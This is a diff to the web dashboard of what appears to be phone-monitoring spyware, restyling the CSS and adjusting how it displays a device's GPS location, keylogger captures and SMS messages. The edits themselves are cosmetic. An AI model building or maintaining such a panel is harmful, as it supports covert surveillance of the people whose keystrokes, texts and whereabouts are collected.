@@ -277,11 +277,26 @@
         }
         .data-card-footer { font-size: 0.8rem; color: var(--text-secondary); text-align: right; margin-top: 1rem; opacity: 0.8; }
         
-        .location-card .data-card-body div { display: flex; gap: 1rem; align-items: flex-start; margin-bottom: 1rem; }
+        /* FIX: Made selector more specific */
+        .location-card .data-card-body > div {
+            display: flex;
+            gap: 1rem;
+            align-items: flex-start;
+            margin-bottom: 1rem;
+        }
         .map-link {
-            display: inline-flex; align-items: center; gap: 8px; margin-top: 1rem; padding: 10px 18px;
-            background: var(--accent-teal); color: #fff; text-decoration: none;
-            border-radius: 8px; font-weight: 500; transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 1rem;
+            padding: 10px 18px;
+            background: var(--accent-teal);
+            color: #fff;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 500;
+            transition: all 0.3s;
+            white-space: nowrap; /* FIX: Prevents button text from wrapping */
         }
         .map-link:hover { background: var(--accent-purple); }
 
@@ -333,8 +348,31 @@
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 999; }
         .loader { width: 50px; height: 50px; border-radius: 50%; margin: 40px auto; border: 5px solid var(--secondary-surface); border-top-color: var(--accent-teal); animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .page-footer { position: fixed; bottom: 0; left: 0; width: 100%; background-color: var(--primary-surface); backdrop-filter: blur(10px); color: var(--text-secondary); text-align: center; padding: 12px 0; font-size: 0.9rem; z-index: 1002; border-top: 1px solid var(--border-color); height: 45px; }
-        .page-footer a { color: var(--accent-teal); text-decoration: none; font-weight: 600; transition: color 0.3s; }
+        
+        .page-footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: var(--primary-surface);
+            backdrop-filter: blur(10px);
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            z-index: 1002;
+            border-top: 1px solid var(--border-color);
+            height: 45px;
+            /* FIX: Centering content robustly */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .page-footer a {
+            color: var(--accent-teal);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
         .page-footer a:hover { color: var(--accent-blue); }
         
         /* --- Responsive --- */
@@ -714,7 +752,8 @@
                     const loc = data; // Location is an object, not an array
                     let mapLink = '';
                     if (loc.latitude && loc.longitude) {
-                        mapLink = `<a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
+                         // FIX: Corrected Google Maps URL
+                        mapLink = `<a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                     }
                     contentHTML = `
                         <div class="data-card location-card">
@@ -733,7 +772,7 @@
                     break;
 
                 case 'keylogger':
-                    contentHTML = '<div class="data-list">'; // FIX: Use single-column list
+                    contentHTML = '<div class="data-list">';
                     dataArray.forEach(log => {
                         if (log && log.keyText) {
                             const parts = log.keyText.split(' |');
@@ -754,11 +793,10 @@
                     break;
                 
                 case 'sms':
-                    contentHTML = '<div class="data-list">'; // FIX: Use single-column list
+                    contentHTML = '<div class="data-list">';
                     dataArray.forEach(sms => {
                         if (sms) {
                             const isOutgoing = sms.type === 2;
-                            // FIX: Swapped logic as requested by user
                             const title = isOutgoing ? `From: ${sms.smsAddress || 'Unknown'}` : 'Sent SMS';
                             const iconColor = isOutgoing ? 'var(--accent-blue)' : 'var(--accent-teal)';
                             
